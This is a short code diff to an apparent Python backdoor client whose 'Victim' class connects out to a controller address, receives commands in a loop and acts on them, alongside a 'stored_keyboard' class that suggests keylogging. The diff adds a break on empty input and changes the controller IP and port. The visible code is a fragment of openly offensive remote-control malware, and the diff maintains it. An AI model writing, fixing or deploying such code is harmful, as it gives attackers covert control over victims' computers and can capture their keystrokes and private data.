@@ -18,6 +18,8 @@ class Victim:
 
         while True:
             command = self.victimSocket.recv(1024).decode("gbk")
+            if not command:
+                break
             commlist = command.split()
             if command == 'exit':
                 break
@@ -200,4 +202,4 @@ class stored_keyboard:
 
 
 if __name__ == '__main__':
-    victim = Victim("192.168.88.138", 6667)
+    victim = Victim("192.168.88.137", 6666)
